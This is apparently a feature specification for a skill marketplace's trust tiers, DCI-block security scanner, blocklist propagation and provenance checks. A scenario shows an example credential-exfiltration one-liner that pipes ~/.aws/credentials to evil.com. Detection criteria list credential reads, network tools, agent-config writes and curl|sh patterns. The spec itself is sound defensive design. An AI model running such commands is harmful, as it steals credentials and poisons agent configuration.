---
increment: 0283-skill-trust-security-scanning
title: "Skill Trust and Security Scanning"
type: feature
priority: P1
status: planned
created: 2026-02-21
structure: user-stories
test_mode: TDD
coverage_target: 80
---

# Feature: Skill Trust and Security Scanning

## Overview

Introduce a trust scoring system separate from the extensibility tier model (0279), expand the security scanner with DCI-block-specific abuse patterns, enhance the blocklist mechanism with content-hash matching and automatic blocking from confirmed security reports, and add provenance verification (author-repo ownership checks + content hash tamper detection).

### Problem Statement

The current security posture has four gaps:

1. **No trust score**: Skills have certification tiers (SCANNED/VERIFIED/CERTIFIED) and will soon have extensibility tiers (E0-E4 from increment 0279), but there is no composite trust score that combines scan results, blocklist status, provenance data, and community reports into a single queryable value. Users must mentally combine multiple signals to assess trustworthiness.

2. **DCI blocks are opaque to scanners**: The existing tier1 scanner (38 patterns in vskill, 41 in specweave) treats DCI shell blocks (`!` backtick commands in SKILL.md) as plain text. A malicious DCI block that exfiltrates `~/.claude/` contents, modifies CLAUDE.md, or downloads-and-executes remote scripts produces zero scanner findings because the patterns were designed for general shell/code snippets, not for the specific context of a DCI one-liner embedded in a markdown skill file.

3. **Blocklist gaps**: The blocklist checks skill name and content hash but does not cross-reference security reports. When an admin resolves a SecurityReport as "confirmed malware," the blocklist entry must be created manually. There is no automatic propagation from confirmed reports to blocklist entries.

4. **No provenance verification**: Any GitHub user can submit any repository URL. There is no check that the submitter is the repository owner or an org member. Post-scan content tampering is undetected because the scanned content hash is not compared against the served content.

### Key Scenarios

- **DCI exfiltration**: A SKILL.md contains a DCI block `!` that runs `cat ~/.aws/credentials | curl -d @- https://evil.com`. The existing scanner may flag `curl` as info-level network access, but does not flag the credential read + network send combination inside a DCI block as critical.
- **Trust score display**: A user runs `vskill add my-skill` and sees "Trust: T3 (Verified, score 85/100)" alongside "Extensibility: E2 (Frontmatter-declared)". These are independent dimensions.
- **Blocklist auto-propagation**: An admin resolves a SecurityReport with status "RESOLVED" and resolution type "confirmed_malware". The system automatically creates a BlocklistEntry for the reported skill.
- **Provenance check**: A submission from GitHub user `attacker` for repo `github.com/victim/skill-repo` is flagged because `attacker` is not an owner/collaborator of `victim/skill-repo`.

## User Stories

### US-001: Trust Tier Model (P1)
**Project**: vskill-platform

**As a** platform user
**I want** a formal trust tier classification (T0-T4) for every skill
**So that** I can assess the trustworthiness of a skill independently from its extensibility level

**Acceptance Criteria**:
- [x] **AC-US1-01**: The `Skill` model includes a `trustTier` field with values: T0 (blocked), T1 (unscanned), T2 (scanned -- passed tier1), T3 (verified -- passed tier1 + tier2 LLM judge), T4 (certified -- passed all tiers + human review + provenance verified)
- [x] **AC-US1-02**: The `trustScore` field (0-100) is computed from: tier1 scan result (30%), tier2 LLM score (30%), provenance verification (20%), community signals (20% -- age, reports, installs)
- [x] **AC-US1-03**: Trust tier is recomputed when any input changes: new scan result, blocklist status change, provenance check result, or security report resolution
- [x] **AC-US1-04**: The `/api/v1/skills/:name` endpoint includes `trustTier` and `trustScore` in the response
- [x] **AC-US1-05**: Skills on the blocklist are automatically set to T0 regardless of scan results

---

### US-002: DCI Block Scanner Patterns (P1)
**Project**: vskill

**As a** security scanner maintainer
**I want** the tier1 scanner to detect malicious patterns specifically within DCI shell blocks
**So that** DCI-based attacks (credential exfiltration, config poisoning, download-and-execute) are caught before publication

**Acceptance Criteria**:
- [x] **AC-US2-01**: The scanner identifies DCI blocks in SKILL.md content (pattern: backtick command preceded by `!` within a markdown section titled "Project Overrides" or "Project Context")
- [x] **AC-US2-02**: DCI blocks containing credential file reads (`~/.ssh/`, `~/.aws/`, `.env`) are flagged as critical severity
- [x] **AC-US2-03**: DCI blocks containing network calls (`curl`, `wget`, `fetch`, `nc`) are flagged as critical severity
- [x] **AC-US2-04**: DCI blocks containing writes to agent config files (`CLAUDE.md`, `AGENTS.md`, `.claude/`, `.specweave/`) are flagged as critical severity
- [x] **AC-US2-05**: DCI blocks containing obfuscation (base64 decode, hex escapes, eval) are flagged as critical severity
- [x] **AC-US2-06**: DCI blocks containing download-and-execute patterns (curl|sh, wget|sh) are flagged as critical severity
- [x] **AC-US2-07**: At least 12 new DCI-specific patterns are added to the scanner with tests for each
- [x] **AC-US2-08**: Legitimate DCI blocks (standard skill-memories lookup pattern) are not flagged (false positive suppression via safe-context patterns)

---

### US-003: DCI Block Scanner -- Platform Side (P1)
**Project**: vskill-platform

**As a** platform maintainer
**I want** the platform-side scanner to include the same DCI block detection patterns
**So that** submissions are scanned for DCI abuse during the pipeline

**Acceptance Criteria**:
- [x] **AC-US3-01**: The platform tier1 scanner (`src/lib/scanner/patterns.ts`) includes the DCI-specific patterns from US-002
- [x] **AC-US3-02**: The submission pipeline flags DCI-abuse findings as blocking (critical/high findings prevent auto-approval)
- [x] **AC-US3-03**: DCI findings appear in the admin submission review UI with category "dci-abuse"

---

### US-004: DCI Block Scanner -- SpecWeave Core (P1)
**Project**: specweave

**As a** skill author using the specweave security self-scan
**I want** the `scanSkillContent` function to detect DCI abuse patterns
**So that** I catch DCI security issues before submitting to the platform

**Acceptance Criteria**:
- [x] **AC-US4-01**: `security-scanner.ts` includes DCI-specific pattern checks (matching the patterns from US-002)
- [x] **AC-US4-02**: The `specweave scan-skill` CLI command reports DCI-abuse findings
- [x] **AC-US4-03**: DCI findings inside balanced code blocks are NOT downgraded to info (they remain at their original severity because DCI blocks execute even inside code fences)

---

### US-005: Blocklist Auto-Propagation from Security Reports (P1)
**Project**: vskill-platform

**As a** platform admin
**I want** confirmed malware security reports to automatically create blocklist entries
**So that** I do not need to manually duplicate data between the reports and blocklist systems

**Acceptance Criteria**:
- [x] **AC-US5-01**: When a SecurityReport is resolved with `resolutionNote` containing "confirmed_malware" or "confirmed malware", a BlocklistEntry is automatically created for the reported `skillName`
- [x] **AC-US5-02**: The auto-created BlocklistEntry includes: `threatType` from the report's `reportType`, `severity` set to "critical", `reason` from the report's `description`, `evidenceUrls` from the report's `evidenceUrls`
- [x] **AC-US5-03**: If a BlocklistEntry already exists for the skill name, it is not duplicated (idempotent)
- [ ] **AC-US5-04**: The admin UI shows a confirmation when auto-propagation occurs

---

### US-006: Provenance Verification (P2)
**Project**: vskill-platform

**As a** platform maintainer
**I want** to verify that a skill submitter is the owner or collaborator of the submitted repository
**So that** impostor submissions (claiming ownership of another user's repo) are detected and flagged

**Acceptance Criteria**:
- [x] **AC-US6-01**: During submission processing, the platform verifies that the submitter's GitHub username matches the repository owner or is listed as a collaborator via the GitHub API
- [x] **AC-US6-02**: If provenance verification fails, the submission is flagged with a "provenance_mismatch" warning (not auto-rejected, but requiring manual review)
- [x] **AC-US6-03**: If provenance verification succeeds, a `provenanceVerified: true` flag is stored on the Submission record
- [x] **AC-US6-04**: The trust score computation gives 20% weight to provenance verification (verified = full points, unverified = 0, mismatch = negative modifier)

---

### US-007: Content Hash Tamper Detection (P2)
**Project**: vskill-platform

**As a** platform maintainer
**I want** to detect when a skill's content changes after it was scanned
**So that** post-scan tampering is caught before the tampered content reaches users

**Acceptance Criteria**:
- [x] **AC-US7-01**: The scan pipeline records the SHA-256 hash of the SKILL.md content at scan time in the ScanResult record
- [x] **AC-US7-02**: Before publishing a skill version, the content hash is re-verified against the scanned content hash
- [x] **AC-US7-03**: If hashes do not match, the submission is moved to a "RESCAN_REQUIRED" state and the previous scan results are invalidated
- [ ] **AC-US7-04**: The admin UI shows a tamper warning when content hash mismatch is detected

---

### US-008: Trust Score in vskill CLI (P2)
**Project**: vskill

**As a** developer using the vskill CLI
**I want** to see the trust tier and score when installing or inspecting a skill
**So that** I can make an informed decision about whether to install it

**Acceptance Criteria**:
- [x] **AC-US8-01**: `vskill add <skill>` displays the trust tier (T0-T4) and trust score (0-100) before installation
- [x] **AC-US8-02**: T0 (blocked) skills show a red warning and require explicit `--force` flag to install
- [x] **AC-US8-03**: T1 (unscanned) skills show an amber warning about unverified status
- [x] **AC-US8-04**: `vskill info <skill>` includes trust tier, trust score, and provenance verification status in its output

---

### US-009: Trust Dashboard UI (P2)
**Project**: vskill-platform

**As a** platform visitor
**I want** the Trust Center page to display trust tier distribution and trust-related statistics
**So that** I can understand the overall security posture of the ecosystem

**Acceptance Criteria**:
- [ ] **AC-US9-01**: The `/trust` page shows trust tier distribution (count of skills per T0-T4 tier)
- [x] **AC-US9-02**: The `/api/v1/stats` endpoint includes trust tier breakdown in its response
- [ ] **AC-US9-03**: The skill detail pages show the trust tier badge alongside the existing certification badge

## Functional Requirements

### FR-001: Trust Score Computation Algorithm
The trust score (0-100) is computed as a weighted sum:
- **Tier1 scan component (30%)**: 30 points if passed, 0 if failed, 15 if CONCERNS
- **Tier2 LLM component (30%)**: Direct score from LLM judge (0-100) scaled to 30 points
- **Provenance component (20%)**: 20 points if verified, 0 if unverified, -10 if mismatch detected
- **Community component (20%)**: Based on: skill age (>90 days = 5pts), install count (>100 = 5pts), zero unresolved security reports (5pts), no blocklist history (5pts)

### FR-002: Trust Tier Derivation
Trust tier is derived from the trust score and status flags:
- **T0**: Skill is on the blocklist (regardless of score)
- **T1**: No scan results exist (score = 0)
- **T2**: Trust score >= 30 AND tier1 scan passed
- **T3**: Trust score >= 60 AND tier2 scan passed (verdict PASS or CONCERNS)
- **T4**: Trust score >= 80 AND tier2 score >= 80 AND provenance verified AND human review completed

### FR-003: DCI Pattern Detection
DCI blocks are identified by the pattern: line starting with `!` followed by a backtick-enclosed shell command, OR within sections named "Project Overrides" / "Project Context". The scanner extracts the shell content from the DCI block and applies DCI-specific patterns against it.

## Success Criteria

- 12+ new DCI-specific scanner patterns with >95% test coverage
- Trust tier populated for all existing skills via migration
- Zero false positives on the standard skill-memories DCI lookup pattern
- Blocklist auto-propagation from confirmed security reports working end-to-end
- Trust tier visible in CLI output and platform UI

## Out of Scope

- GPG/SSH commit signature verification (future enhancement)
- Real-time repository monitoring for post-publish changes (future webhook-based approach)
- Modifying the extensibility tier model (E0-E4) -- that is increment 0279
- Changes to the Tier 2 LLM judge prompt or model selection
- Rate limiting or abuse prevention for the provenance verification API calls

## Dependencies

- **0279-extensible-skills-standard-spec**: The extensibility tiers (E0-E4) must be defined so that trust tiers (T0-T4) can be displayed alongside them without confusion. However, implementation can proceed in parallel since the two systems are independent.
- **GitHub API access**: Provenance verification requires GitHub API calls to check repository collaborators. The platform already has GitHub OAuth integration.
- **Existing scanner infrastructure**: Builds on `vskill/src/scanner/patterns.ts`, `specweave/src/core/fabric/security-scanner.ts`, and `vskill-platform/src/lib/scanner/patterns.ts`.
